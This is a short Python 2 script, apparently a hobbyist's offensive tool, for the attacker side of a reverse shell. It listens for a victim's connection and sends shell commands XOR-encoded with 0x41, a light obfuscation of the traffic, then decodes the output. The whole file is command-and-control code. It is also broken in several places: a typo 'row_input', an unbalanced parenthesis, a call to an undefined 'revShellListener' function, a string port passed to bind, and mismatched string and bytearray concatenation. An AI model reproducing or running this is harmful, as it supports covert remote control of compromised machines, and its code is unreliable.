#!/usr/bin/python

import os
import sys
import socket

# usage: python revShellListener.py <LHOST> <LPORT>


######## Creates a socket to listen for connections ######

def createListener(LHOST, LPORT):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((LHOST, LPORT))
    s.listen(2)
    print "[+] Listening on port "+LPORT+" ... "
    ((client, (ip, port)) = s.accept()
    print " Successful connection from: ", ip

    while True:
        command = row_input('~$ ')

        # encoding byte data
        b_encode = bytearray(command)
        for i in range(len(b_encode)):
            b_encode[i] ^=0x41
        client.send(b_encode)
        b_data = client.recv(2048)
        print "[+] Encoding... "
        # decoding byte data
        b_decode = bytearray(b_data)
        for i in range(len(b_decode)):
            b_decode[i] ^=0x41
        print "[+] Decoded data: "+b_decode

    client.close()
    s.close()


########## main ###########
if __name__ == "__main__":
    LHOST = sys.argv[1]
    LPORT = sys.argv[2]
    revShellListener(LHOST, LPORT)
